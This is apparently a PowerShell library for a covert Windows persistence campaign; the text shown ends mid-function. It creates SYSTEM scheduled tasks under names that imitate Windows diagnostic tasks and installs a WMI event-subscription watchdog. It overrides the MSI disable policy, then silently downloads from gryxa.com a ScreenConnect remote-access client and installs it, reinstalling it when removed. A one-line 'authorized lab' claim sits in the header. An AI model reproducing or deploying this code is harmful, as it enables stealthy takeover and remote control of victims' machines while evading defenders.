#Requires -Version 5.1
# ═══════════════════════════════════════════════════════════════
# OWN_LIB  BUILD 20260802L27
# Shared library: per-host identity (anti-signature), WMI watchdog
# (mutual persistence chain), campaign state file, SC service repair.
# L27: default FP rotated to 36e506ff016b2151 (fresh hosts). L26: allow by gryxa.com relay OR keeper FP.
# L21: stuck registered (svc+dir gone) -> /fa then ARP nuke + same-FP /i; return fix.
# L20: -Deep must not skip light start/repair (rate-limit left Gryxa Stopped).
# L19: rate-limit never blocks when Gryxa fully absent; StartPending keep.
# L18: exterminate was KILLING Gryxa (null-path proc kill); sync FP before kill.
# L17: Gryxa reinstall LOCK while any non-sevrz SC Running; FP drift never /x.
# L16: NEVER reinstall Gryxa when Running (panel duplicates); TCP advisory only.
# L15: gryxa-health / gryxa-ensure — 8h deep check (TCP/relay/FP drift reinstall).
# L13: schtasks Create via cmd (like WucacheOwn), TR under Windows\Temp\.wucache
#      (not ACL-locked ProgramData path), /ST 00:00 on MINUTE, no leading \.
# L12: IDENTVER=7 ROOT-level task names (nested Microsoft\Windows Access Denied).
# L11: NEVER reuse real Windows built-in task names; TR ownership checks.
# Authorized internal deployment - lab/competition scope only.
# ═══════════════════════════════════════════════════════════════
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [ValidateSet('init', 'watchdog', 'watchdog-ensure', 'tasks-ensure', 'state', 'identity', 'repair', 'registered', 'exterminate', 'gryxa-health', 'gryxa-ensure')]
    [string]$Action,
    [string]$WorkDir = 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache',
    [string]$MonPath = '',
    [string]$Build  = 'O15',
    [string]$Extra  = '',
    [string]$Fp     = '',
    [switch]$Deep,
    [switch]$Force
)

$ErrorActionPreference = 'SilentlyContinue'
$cfgPath = Join-Path $WorkDir 'identity.cfg'
$IdentVersion = 8

# Root-level names WITHOUT leading backslash (matches working WucacheOwn style).
$Pools = @{
    A = @('WerQueueSync','DiagHostCache','NetTraceCache','WdiHostProxy','PlaServerHealth','TcpIpConflictRes','SrCacheSync','ResolutionQueue')
    B = @('PlaServerHealth','WdiHostProxy','WerQueueSync','NetTraceCache','DiagHostCache','TcpIpConflictRes','PlaServerDiag','SrCacheSync')
    C = @('ResolutionQueue','NetTraceCache','TcpIpConflictRes','WerQueueSync','PlaServerHealth','DiagHostCache','PlaServerDiag','WdiHostProxy')
    D = @('TcpIpConflictRes','ResolutionQueue','NetTraceCache','DiagHostCache','PlaServerDiag','WerQueueSync','PlaServerHealth','WdiHostProxy')
}
$Defaults = [ordered]@{
    TASK_A = 'WerQueueSync'
    TASK_B = 'PlaServerHealth'
    TASK_C = 'WdiHostProxy'
    TASK_D = 'TcpIpConflictRes'
    MO_A   = '2'
    MO_B   = '3'
}

function Get-HostSeed {
    $s = 0L
    foreach ($c in $env:COMPUTERNAME.ToUpper().ToCharArray()) { $s = ($s * 31 + [int]$c) % 1000000007 }
    return $s
}

function Read-Identity {
    $id = $Defaults.Clone()
    if (Test-Path $cfgPath) {
        foreach ($line in (Get-Content -LiteralPath $cfgPath -Force)) {
            if ($line -match '^\s*([A-Z_]+)\s*=\s*(.+?)\s*$') { $id[$matches[1]] = $matches[2] }
        }
    }
    return $id
}

function Remove-TaskQuiet([string]$tn) {
    if ($tn) { & schtasks.exe /Delete /TN $tn /F 2>&1 | Out-Null }
}

function Get-TaskVerboseBlob([string]$tn) {
    if (-not $tn) { return '' }
    $out = & schtasks.exe /Query /TN $tn /FO LIST /V 2>$null
    if ($LASTEXITCODE -ne 0 -or -not $out) { return '' }
    return (($out | ForEach-Object { "$_" }) -join "`n")
}

function Test-TaskOwnsMon([string]$tn, [string]$marker) {
    # True only if the scheduled action points at OUR mon/etl path — not a Windows COM handler.
    $blob = Get-TaskVerboseBlob $tn
    if (-not $blob) { return $false }
    if ($marker -and ($blob -match [regex]::Escape($marker))) { return $true }
    if ($blob -match '(?i)\.wucache\\|own_mon\.cmd|etl_mon\.cmd|\.etlcache\\') { return $true }
    return $false
}

function Initialize-Identity {
    # Idempotent within an IDENTVER generation. Pool upgrades bump IDENTVER:
    # owned old-name tasks are deleted; Windows built-ins with same name are left alone.
    if (Test-Path $cfgPath) {
        $old = Read-Identity
        # L7: also regenerate if any TASK_* is empty (L4-L6 modulo/cast bugs left blank slots)
        $slotsOk = ($old['IDENTVER'] -eq "$IdentVersion") -and $old['TASK_A'] -and $old['TASK_B'] -and $old['TASK_C'] -and $old['TASK_D']
        if ($slotsOk) { return $old }
        foreach ($k in 'TASK_A','TASK_B','TASK_C','TASK_D') {
            $tn = [string]$old[$k]
            if (-not $tn) { continue }
            # Never delete a real Windows task we never owned (TR is COM/custom handler).
            if (Test-TaskOwnsMon $tn '') { Remove-TaskQuiet $tn }
        }
        Remove-Item -LiteralPath $cfgPath -Force
    }
    $s = Get-HostSeed
    # L4: two slots may hash to the same task path (pools share names) ->
    # one physical task then satisfies two slots and the fleet shows 3/4.
    # Walk each pool forward until the pick is unique across slots.
    # L6: the old @(@('A', $s % 8), ...) form was double-broken in PS 5.1:
    # bare % inside @() parses as the ForEach-Object alias (not modulo), so the
    # collection collapsed and the loop never ran -> identity.cfg had EMPTY
    # TASK_* and the whole fleet fell back to identical default task names.
    $seeds = [ordered]@{
        A = ($s % 8)
        B = (($s + 3) % 8)
        C = (($s + 5) % 8)
        D = (($s + 7) % 8)
    }
    $pick = [ordered]@{}
    foreach ($letter in 'A','B','C','D') {
        $i = [int]$seeds[$letter]
        $name = $Pools[$letter][$i]
        $n = 0
        while ($pick.Values -contains $name -and $n -lt 8) { $i = ($i + 1) % 8; $name = $Pools[$letter][$i]; $n++ }
        if (-not $name) { $name = $Defaults["TASK_$letter"] }
        $pick[$letter] = $name
    }
    $cfg = @(
        "TASK_A=$($pick.A)"
        "TASK_B=$($pick.B)"
        "TASK_C=$($pick.C)"
        "TASK_D=$($pick.D)"
        "MO_A=$(2 + ($s % 4))"          # 2-5 min jitter
        "MO_B=$(3 + (($s + 1) % 3))"    # 3-5 min jitter
        "SEED=$s"
        "IDENTVER=$IdentVersion"
    )
    Set-Content -LiteralPath $cfgPath -Value $cfg -Force
    return (Read-Identity)
}

function Normalize-TaskName([string]$tn) {
    if (-not $tn) { return '' }
    return $tn.Trim().TrimStart('\')
}

function Write-OwnLog([string]$m) {
    $log = Join-Path $WorkDir 'boot.err'
    try { Add-Content -LiteralPath $log -Value $m -Force } catch {}
}

function Ensure-PersistTasks {
    # Mirror working detach (WucacheOwn): cmd schtasks, BOOT TR path, /ST on MINUTE.
    $id = Initialize-Identity
    if (-not $MonPath) { $MonPath = Join-Path $WorkDir 'own_mon.cmd' }
    $boot = Join-Path $env:SystemRoot 'Temp\.wucache'
    $etlDir = 'C:\ProgramData\Microsoft\Diagnosis\State\.etlcache'
    foreach ($d in @($boot, $etlDir)) {
        if (-not (Test-Path -LiteralPath $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null }
    }
    $bootMon = Join-Path $boot 'own_mon.cmd'
    $bootEtl = Join-Path $boot 'etl_mon.cmd'
    $etlMon = Join-Path $etlDir 'etl_mon.cmd'
    if (Test-Path -LiteralPath $MonPath) {
        Copy-Item -LiteralPath $MonPath -Destination $bootMon -Force -ErrorAction SilentlyContinue
        Copy-Item -LiteralPath $MonPath -Destination $bootEtl -Force -ErrorAction SilentlyContinue
        Copy-Item -LiteralPath $MonPath -Destination $etlMon -Force -ErrorAction SilentlyContinue
    }
    # BOOT is not LockDir'd by own_secure — Task Scheduler can resolve TR there.
    $trMon = "cmd.exe /c $bootMon"
    $trEtl = "cmd.exe /c $bootEtl"
    $moA = [string]$id['MO_A']; if (-not $moA) { $moA = '2' }
    $moB = [string]$id['MO_B']; if (-not $moB) { $moB = '3' }
    $st = (Get-Date).ToString('HH:mm')
    $specs = @(
        @{ Key = 'TASK_A'; Marker = 'own_mon.cmd'; Sc = 'MINUTE'; Mo = $moA; Tr = $trMon }
        @{ Key = 'TASK_B'; Marker = 'etl_mon.cmd'; Sc = 'MINUTE'; Mo = $moB; Tr = $trEtl }
        @{ Key = 'TASK_C'; Marker = 'own_mon.cmd'; Sc = 'ONSTART'; Mo = ''; Tr = $trMon }
        @{ Key = 'TASK_D'; Marker = 'own_mon.cmd'; Sc = 'ONLOGON'; Mo = ''; Tr = $trMon }
    )
    $ok = 0; $rearmed = 0; $fail = 0
    foreach ($sp in $specs) {
        $tn = Normalize-TaskName ([string]$id[$sp.Key])
        if (-not $tn) { $fail++; continue }
        if (Test-TaskOwnsMon $tn $sp.Marker) { $ok++; continue }
        if (Test-TaskOwnsMon ("\$tn") $sp.Marker) { $ok++; continue }
        $blob = Get-TaskVerboseBlob $tn
        if (-not $blob) { $blob = Get-TaskVerboseBlob ("\$tn") }
        if ($blob) {
            $oursBroken = ($blob -match '(?i)own_mon\.cmd|etl_mon\.cmd|\.wucache\\|\.etlcache\\')
            if (-not $oursBroken) { $fail++; Write-OwnLog "tasks_skip_foreign $tn"; continue }
            Remove-TaskQuiet $tn
            Remove-TaskQuiet ("\$tn")
        }
        # Build cmdline exactly like own.cmd detach (proven to work as SYSTEM).
        $parts = @(
            '/Create', '/TN', $tn, '/RU', 'SYSTEM', '/RL', 'HIGHEST', '/F',
            '/TR', $sp.Tr, '/SC', $sp.Sc
        )
        if ($sp.Sc -eq 'MINUTE') {
            $parts += @('/MO', $sp.Mo, '/ST', $st)
        }
        $argLine = ($parts | ForEach-Object {
            if ($_ -match '[\s"]') { '"{0}"' -f ($_ -replace '"', '\"') } else { $_ }
        }) -join ' '
        $createTxt = cmd.exe /c "schtasks.exe $argLine" 2>&1 | ForEach-Object { "$_" }
        $createJoined = ($createTxt -join ' ').Trim()
        Write-OwnLog "tasks_create $($sp.Key) $tn => $createJoined"
        if ((Test-TaskOwnsMon $tn $sp.Marker) -or (Test-TaskOwnsMon ("\$tn") $sp.Marker)) {
            $rearmed++
            if ($sp.Key -eq 'TASK_A' -or $sp.Key -eq 'TASK_B') {
                cmd.exe /c "schtasks.exe /Run /TN `"$tn`"" | Out-Null
            }
        } else {
            $fail++
            Write-OwnLog "tasks_create_FAIL $($sp.Key) $tn"
        }
    }
    return "tasks ok=$ok rearmed=$rearmed fail=$fail"
}

function Remove-Watchdog {
    foreach ($cls in @('__FilterToConsumerBinding','__EventFilter','CommandLineEventConsumer','__IntervalTimerInstruction')) {
        Get-WmiObject -Namespace root\subscription -Class $cls -ErrorAction SilentlyContinue |
            Where-Object {
                ($_.Name -eq 'WucacheWatchdogF') -or ($_.Name -eq 'WucacheWatchdogC') -or
                ($_.TimerId -eq 'WucacheWatchdog') -or
                ($_.Filter -and $_.Filter.ToString() -like '*WucacheWatchdogF*') -or
                ($_.Consumer -and $_.Consumer.ToString() -like '*WucacheWatchdogC*')
            } | ForEach-Object { $_.Delete() | Out-Null }
    }
}

function Install-Watchdog {
    if (-not $MonPath) { return $false }
    Remove-Watchdog
    $ok = $true
    try {
        Set-WmiInstance -Namespace root\subscription -Class __IntervalTimerInstruction `
            -Arguments @{ TimerId = 'WucacheWatchdog'; IntervalMilliseconds = 180000; SkipIfPassed = $false } | Out-Null
        $f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter `
            -Arguments @{ Name = 'WucacheWatchdogF'; EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL';
                          Query = "SELECT * FROM __TimerEvent WHERE TimerId='WucacheWatchdog'" }
        $c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer `
            -Arguments @{ Name = 'WucacheWatchdogC'; CommandLineTemplate = "cmd.exe /c `"$MonPath`""; RunInteractively = $false }
        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding `
            -Arguments @{ Filter = $f; Consumer = $c } | Out-Null
    } catch { $ok = $false }
    return $ok
}

function Test-WatchdogGraph {
    $t = Get-WmiObject -Namespace root\subscription -Class __IntervalTimerInstruction -Filter "TimerId='WucacheWatchdog'" -ErrorAction SilentlyContinue
    $f = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='WucacheWatchdogF'" -ErrorAction SilentlyContinue
    $c = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WucacheWatchdogC'" -ErrorAction SilentlyContinue
    $b = $null
    if ($f -and $c) {
        $b = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
            Where-Object { $_.Filter -like '*WucacheWatchdogF*' -and $_.Consumer -like '*WucacheWatchdogC*' } |
            Select-Object -First 1
    }
    return [bool]($t -and $f -and $c -and $b)
}

function Ensure-Watchdog {
    if (Test-WatchdogGraph) { return 'OK' }
    if (-not $MonPath) { return 'MISSING' }
    if (Install-Watchdog) { return 'REARMED' }
    return 'FAIL'
}

# Correct 32-bit + 64-bit ARP hives. L6 and earlier used a truncated
# WOW6432Node path (missing Microsoft\Windows) so EVERY 32-bit SC product
# was invisible to repair/exterminate/registered.
$script:UninstallRoots = @(
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
    'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
)

function Test-SCRegistered([string]$Fingerprint) {
    # L8: NEVER use return inside ForEach-Object - it only exits the
    # pipeline iteration, so this function always fell through to 'no'
    # and the mon orphan-ladder deleted healthy registered services.
    if (-not $Fingerprint) { return 'no' }
    $name = "ScreenConnect Client ($Fingerprint)"
    foreach ($root in $script:UninstallRoots) {
        if (-not (Test-Path $root)) { continue }
        foreach ($key in (Get-ChildItem $root -ErrorAction SilentlyContinue)) {
            $dn = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).DisplayName
            if ($dn -and ($dn -ieq $name) -and ($key.PSChildName -like '{*}')) { return 'yes' }
        }
    }
    return 'no'
}

function Repair-SCService([string]$Fingerprint) {
    # Recreates a deleted SC service entry by repairing the REGISTERED product.
    # msiexec /fa {GUID} repairs in place - it does NOT run the SC-family
    # major-upgrade removal, so other instances are untouched.
    # L5: also handles present-but-STOPPED services (repair restores binaries,
    # then start). Only a Running service is considered healthy.
    if (-not $Fingerprint) { return 'no-fp' }
    $name = "ScreenConnect Client ($Fingerprint)"
    $svc = Get-Service -Name $name -ErrorAction SilentlyContinue
    if ($svc -and $svc.Status -eq 'Running') { return 'svc-running' }
    $guid = $null
    foreach ($root in $script:UninstallRoots) {
        if (-not (Test-Path $root)) { continue }
        foreach ($key in (Get-ChildItem $root -ErrorAction SilentlyContinue)) {
            $dn = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).DisplayName
            if ($dn -and ($dn -ieq $name) -and ($key.PSChildName -like '{*}')) { $guid = $key.PSChildName; break }
        }
        if ($guid) { break }
    }
    if (-not $guid) { return 'not-registered' }
    & reg.exe delete 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' /v DisableMSI /f 2>&1 | Out-Null
    & reg.exe add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' /v DisableMSI /t REG_DWORD /d 0 /f 2>&1 | Out-Null
    $log = Join-Path $WorkDir "msi_repair_$Fingerprint.log"
    $p = Start-Process msiexec.exe -ArgumentList "/fa $guid /qn /norestart /L*v `"$log`"" -Wait -PassThru
    Start-Sleep -Seconds 8
    & sc.exe config "$name" start= auto 2>&1 | Out-Null
    & sc.exe start "$name" 2>&1 | Out-Null
    Start-Sleep -Seconds 4
    $svc = Get-Service -Name $name -ErrorAction SilentlyContinue
    if ($svc -and $svc.Status -eq 'Running') { return "svc-restored exit=$($p.ExitCode)" }
    if ($svc) { return "svc-still-stopped exit=$($p.ExitCode)" }
    return "svc-still-missing exit=$($p.ExitCode)"
}

# ── Gryxa SC v2 (clean rewrite) ───────────────────────────────
# Single-flight ensure. Running => healthy. Stopped svc => start.
# Broken/Stuck => clean-reinstall once, detached. Absent => install once.
# No /fa, no inline blocking /i, no false "already_running".
$script:GryxaDefaultFp = '36e506ff016b2151'
$script:GryxaMsiUrl = 'https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
$script:GryxaRelayHost = 'update.gryxa.com'
$script:GryxaUiHost = 'ui.gryxa.com'
$script:SevrzKeep = @('5f6010579852e507', 'f861c8140d453427')
# Set to a 16-hex FP you WANT installed (after rotating on the panel). Any host
# running a different FP migrates to this one. Leave '' to just track whatever runs.
$script:GryxaExpectedFp = '36e506ff016b2151'

function Get-GryxaCfgPath { Join-Path $WorkDir 'gryxa.cfg' }

function Get-GryxaFp {
    $fp = $script:GryxaDefaultFp
    $p = Get-GryxaCfgPath
    if (Test-Path -LiteralPath $p) {
        Get-Content -LiteralPath $p -ErrorAction SilentlyContinue | ForEach-Object {
            if ($_ -match '^CURRENT_FP=([0-9a-fA-F]{16})\s*$') { $fp = $matches[1].ToLower() }
        }
    }
    return $fp
}

function Set-GryxaFp([string]$Fingerprint) {
    if (-not $Fingerprint) { return }
    if (-not (Test-Path -LiteralPath $WorkDir)) { New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null }
    @(
        "CURRENT_FP=$($Fingerprint.ToLower())",
        "RELAY=$($script:GryxaRelayHost)",
        "UI=$($script:GryxaUiHost)",
        "MSIURL=$($script:GryxaMsiUrl)",
        "UPDATED=$((Get-Date).ToUniversalTime().ToString('o'))"
    ) | Set-Content -LiteralPath (Get-GryxaCfgPath) -Encoding ASCII -Force
}

function Get-KeepFingerprints {
    $set = New-Object 'System.Collections.Generic.HashSet[string]' ([StringComparer]::OrdinalIgnoreCase)
    [void]$set.Add('5f6010579852e507'); [void]$set.Add('f861c8140d453427'); [void]$set.Add((Get-GryxaFp))
    if ($script:GryxaExpectedFp) { [void]$set.Add($script:GryxaExpectedFp) }
    foreach ($svc in (Get-Service -Name 'ScreenConnect Client*' -ErrorAction SilentlyContinue)) {
        if ($svc.Status -notin @('Running','StartPending','ContinuePending')) { continue }
        if ($svc.Name -match '\(([0-9a-f]{16})\)') {
            $fp = $matches[1].ToLower()
            if ($fp -notin $script:SevrzKeep) { [void]$set.Add($fp); Set-GryxaFp $fp }
        }
    }
    return @($set)
}

function Test-TcpHostPort([string]$HostName, [int]$Port = 443, [int]$TimeoutMs = 8000) {
    if (-not $HostName) { return $false }
    $c = $null
    try {
        $c = New-Object System.Net.Sockets.TcpClient
        $iar = $c.BeginConnect($HostName, $Port, $null, $null)
        if (-not $iar.AsyncWaitHandle.WaitOne($TimeoutMs, $false)) { try { $c.Close() } catch {}; return $false }
        $c.EndConnect($iar); return $true
    } catch { return $false } finally { if ($c) { try { $c.Close() } catch {} } }
}

function Get-MsiProperty([string]$MsiPath, [string]$PropertyName) {
    if (-not (Test-Path -LiteralPath $MsiPath)) { return $null }
    try {
        $i = New-Object -ComObject WindowsInstaller.Installer
        $db = $i.OpenDatabase((Resolve-Path -LiteralPath $MsiPath).Path, 0)
        $v = $db.OpenView("SELECT `Value` FROM `Property` WHERE `Property`='$PropertyName'")
        $v.Execute() | Out-Null
        $r = $v.Fetch()
        if (-not $r) { return $null }
        return [string]$r.StringData(1)
    } catch { return $null }
}

function Get-FpFromProductName([string]$ProductName) {
    if ($ProductName -match '\(([0-9a-fA-F]{16})\)') { return $matches[1].ToLower() }
    return $null
}

function Find-ProductGuid([string]$Fingerprint) {
    $name = "ScreenConnect Client ($Fingerprint)"
    foreach ($root in $script:UninstallRoots) {
        if (-not (Test-Path $root)) { continue }
        foreach ($key in (Get-ChildItem $root -ErrorAction SilentlyContinue)) {
            $dn = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).DisplayName
            if ($dn -and ($dn -ieq $name) -and ($key.PSChildName -like '{*}')) { return $key.PSChildName }
        }
    }
    return $null
}

function Test-ScRunning([string]$Fingerprint) {
    if (-not $Fingerprint) { return $false }
    $svc = Get-Service -Name "ScreenConnect Client ($Fingerprint)" -ErrorAction SilentlyContinue
    return [bool]($svc -and $svc.Status -eq 'Running')
}

function Test-ScDir([string]$Fingerprint) {
    foreach ($base in @(${env:ProgramFiles(x86)}, $env:ProgramFiles)) {
        if (Test-Path -LiteralPath (Join-Path $base "ScreenConnect Client ($Fingerprint)")) { return $true }
    }
    return $false
}

function Find-RunningGryxaFp {
    $cfg = Get-GryxaFp
    if (Test-ScRunning $cfg) { return $cfg }
    foreach ($svc in (Get-Service -Name 'ScreenConnect Client*' -ErrorAction SilentlyContinue)) {
        if ($svc.Status -notin @('Running','StartPending','ContinuePending')) { continue }
        if ($svc.Name -match '\(([0-9a-f]{16})\)') {
            $fp = $matches[1].ToLower()
            if ($fp -in $script:SevrzKeep) { continue }
            return $fp
        }
    }
    return $null
}

function Test-AnyNonSevrzScRunning { return [bool](Find-RunningGryxaFp) }

function Get-GryxaStatus([string]$fp) {
    $svc = Get-Service -Name "ScreenConnect Client ($fp)" -ErrorAction SilentlyContinue
    $running = [bool]($svc -and $svc.Status -eq 'Running')
    $dir = Test-ScDir $fp
    $guid = Find-ProductGuid $fp
    $tcpR = Test-TcpHostPort $script:GryxaRelayHost 443
    $tcpU = Test-TcpHostPort $script:GryxaUiHost 443
    if ($running) { return "HEALTHY|$fp|running=1|relay=$tcpR|ui=$tcpU" }
    if ($svc -and $dir) { return "BROKEN|$fp|svc-present-stopped|relay=$tcpR|ui=$tcpU" }
    if (-not $svc -and ($dir -or $guid)) { return "STUCK|$fp|registered-no-service|relay=$tcpR|ui=$tcpU" }
    return "ABSENT|$fp|not-installed|relay=$tcpR|ui=$tcpU"
}

function Test-GryxaHealth { return (Get-GryxaStatus (Get-GryxaFp)) }

function Clear-GryxaArp([string]$fp) {
    $guid = Find-ProductGuid $fp
    foreach ($r in @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
                     'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')) {
        if ($guid -and (Test-Path "$r\$guid")) { Remove-Item -LiteralPath "$r\$guid" -Recurse -Force -ErrorAction SilentlyContinue }
        Get-ChildItem $r -ErrorAction SilentlyContinue | ForEach-Object {
            $dn = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).DisplayName
            if ($dn -match "ScreenConnect Client \($([regex]::Escape($fp))\)") {
                Remove-Item -LiteralPath $_.PSPath -Recurse -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

function Uninstall-ScFingerprint([string]$Fingerprint) {
    if (-not $Fingerprint) { return 'no-fp' }
    $name = "ScreenConnect Client ($Fingerprint)"
    $guid = Find-ProductGuid $Fingerprint
    & reg.exe delete 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' /v DisableMSI /f 2>&1 | Out-Null
    & reg.exe add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' /v DisableMSI /t REG_DWORD /d 0 /f 2>&1 | Out-Null
    if ($guid) { Start-Process msiexec.exe -ArgumentList "/x $guid /qn /norestart REBOOT=ReallySuppress" -Wait -WindowStyle Hidden; Start-Sleep -Seconds 6 }
    $svc = Get-Service -Name $name -ErrorAction SilentlyContinue
    if ($svc) { & sc.exe stop $name 2>&1 | Out-Null; & sc.exe delete $name 2>&1 | Out-Null; Start-Sleep -Seconds 2 }
    Clear-GryxaArp $Fingerprint
    foreach ($base in @(${env:ProgramFiles(x86)}, $env:ProgramFiles)) {
        $d = Join-Path $base "ScreenConnect Client ($Fingerprint)"
        if (Test-Path -LiteralPath $d) { & takeown.exe /F $d /R /D Y 2>&1 | Out-Null; Remove-Item -LiteralPath $d -Recurse -Force -ErrorAction SilentlyContinue }
    }
    return 'removed'
}

function Get-GryxaMsi {
    $msi = Join-Path $WorkDir 'pkg_gryxa.msi'
    # When an FP is pinned, the cached MSI must match it; otherwise refetch.
    if ((Test-Path $msi) -and ((Get-Item $msi).Length -gt 1000000)) {
        if (-not $script:GryxaExpectedFp) { return $msi }
        $cachedFp = Get-FpFromProductName (Get-MsiProperty $msi 'ProductName')
        if ($cachedFp -eq $script:GryxaExpectedFp) { return $msi }
        Remove-Item -LiteralPath $msi -Force -ErrorAction SilentlyContinue
    }
    $tmp = Join-Path $env:TEMP ("sc_gryxa_{0}.msi" -f [guid]::NewGuid().ToString('N'))
    try {
        $curl = Join-Path $env:SystemRoot 'System32\curl.exe'
        if (-not (Test-Path $curl)) { $curl = 'curl.exe' }
        & $curl -L --ssl-no-revoke --connect-timeout 25 --max-time 300 -o $tmp $script:GryxaMsiUrl 2>&1 | Out-Null
        if ((Test-Path $tmp) -and ((Get-Item $tmp).Length -gt 1000000)) { Copy-Item -LiteralPath $tmp -Destination $msi -Force; return $msi }
    } catch {}
    finally { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }
    return $null
}

function Start-GryxaInstall([string]$MsiPath, [string]$Fp, [string]$LogFile) {
    $cmd = Join-Path $WorkDir 'gryxa_install.cmd'
    $lines = @(
        '@echo off',
        "msiexec /i `"$MsiPath`" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v `"$LogFile`"",
        "sc config `"ScreenConnect Client ($Fp)`" start= auto",
        "sc failure `"ScreenConnect Client ($Fp)`" reset= 86400 actions= restart/3000/restart/3000/restart/3000",
        "sc start `"ScreenConnect Client ($Fp)`"",
        'exit'
    )
    Set-Content -LiteralPath $cmd -Value $lines -Encoding ASCII -Force
    Start-Process cmd.exe -ArgumentList "/c `"$cmd`"" -WindowStyle Hidden
}

function Mark-GryxaReinstall {
    Set-Content -LiteralPath (Join-Path $WorkDir 'gryxa_reinstall.flag') -Value (Get-Date).ToUniversalTime().ToString('o') -Encoding ASCII -Force
}

function Invoke-GryxaEnsure {
    if (-not (Test-Path -LiteralPath $WorkDir)) { New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null }
    $log = Join-Path $WorkDir 'gryxa_ensure.log'
    function GLog([string]$m) { Add-Content -LiteralPath $log -Value ('{0} {1}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $m) -ErrorAction SilentlyContinue }

    $installCmd = Join-Path $WorkDir 'gryxa_install.cmd'
    if ((Test-Path $installCmd) -and (((Get-Date) - (Get-Item $installCmd).LastWriteTime).TotalMinutes -lt 15)) {
        GLog 'inflight_install'
        return "HEALTHY|$(Get-GryxaFp)|inflight=1"
    }

    $fp = Get-GryxaFp

    # FP rotation: if an expected FP is pinned and the host is on a different one,
    # migrate (uninstall old FP, install expected) instead of calling the old
    # running instance "healthy".
    $exp = $script:GryxaExpectedFp
    if ($exp) {
        $runningFp0 = Find-RunningGryxaFp
        if (($fp -ne $exp) -or ($runningFp0 -and $runningFp0 -ne $exp)) {
            GLog "fp_drift migrate current=$fp running=$runningFp0 expected=$exp"
            $msi = Get-GryxaMsi
            if (-not $msi) { GLog 'msi_unavailable'; return "UNHEALTHY|$exp|msi-unavailable" }
            $newFp = Get-FpFromProductName (Get-MsiProperty $msi 'ProductName')
            if (-not $newFp) { $newFp = $exp }
            foreach ($old in @($fp, $runningFp0) | Where-Object { $_ -and ($_ -ne $newFp) }) {
                GLog "migrate_uninstall old=$old"
                $null = Uninstall-ScFingerprint $old
            }
            Clear-GryxaArp $newFp
            Set-GryxaFp $newFp
            Start-GryxaInstall $msi $newFp (Join-Path $WorkDir 'msi_gryxa_detached.log')
            Mark-GryxaReinstall
            return "HEALTHY|$newFp|migrate-spawned=1"
        }
    }

    $runningFp = Find-RunningGryxaFp
    if ($runningFp) {
        Set-GryxaFp $runningFp
        GLog "healthy_running fp=$runningFp"
        return "HEALTHY|$runningFp|running=1"
    }

    $st = Get-GryxaStatus $fp
    GLog "status=$st force=$Force"
    $kind = $st.Split('|')[0]

    switch ($kind) {
        'HEALTHY' { return $st }
        'BROKEN' {
            $name = "ScreenConnect Client ($fp)"
            & sc.exe config $name start= auto 2>&1 | Out-Null
            & sc.exe failure $name reset= 86400 actions= restart/3000/restart/3000/restart/3000 2>&1 | Out-Null
            & sc.exe start $name 2>&1 | Out-Null
            Start-Sleep -Seconds 6
            & sc.exe start $name 2>&1 | Out-Null
            if (Test-ScRunning $fp) { GLog 'started_ok'; return "HEALTHY|$fp|started=1" }
            $msi = Get-GryxaMsi
            if (-not $msi) { GLog 'msi_unavailable'; return "UNHEALTHY|$fp|msi-unavailable" }
            $newFp = Get-FpFromProductName (Get-MsiProperty $msi 'ProductName')
            if (-not $newFp) { $newFp = $fp }
            GLog "broken_clean_reinstall fp=$fp new=$newFp"
            $null = Uninstall-ScFingerprint $fp
            Start-GryxaInstall $msi $newFp (Join-Path $WorkDir 'msi_gryxa_detached.log')
            Mark-GryxaReinstall
            return "HEALTHY|$newFp|install-spawned=1"
        }
        'STUCK' {
            $msi = Get-GryxaMsi
            if (-not $msi) { GLog 'msi_unavailable'; return "UNHEALTHY|$fp|msi-unavailable" }
            $newFp = Get-FpFromProductName (Get-MsiProperty $msi 'ProductName')
            if (-not $newFp) { $newFp = $fp }
            GLog "stuck_nuke_and_install fp=$fp new=$newFp"
            Clear-GryxaArp $fp
            if ($newFp -ne $fp) { Clear-GryxaArp $newFp }
            Start-GryxaInstall $msi $newFp (Join-Path $WorkDir 'msi_gryxa_detached.log')
            Mark-GryxaReinstall
            return "HEALTHY|$newFp|install-spawned=1"
        }
        default {
            $msi = Get-GryxaMsi
            if (-not $msi) { GLog 'msi_unavailable'; return "UNHEALTHY|$fp|msi-unavailable" }
            $newFp = Get-FpFromProductName (Get-MsiProperty $msi 'ProductName')
            if (-not $newFp) { GLog 'fp_parse_fail'; return "UNHEALTHY|$fp|msi-fp-parse-fail" }
            GLog "absent_install fp=$newFp"
            Set-GryxaFp $newFp
            Start-GryxaInstall $msi $newFp (Join-Path $WorkDir 'msi_gryxa_detached.log')
            Mark-GryxaReinstall
            return "HEALTHY|$newFp|install-spawned=1"
        }
    }
}

function Invoke-Exterminate {
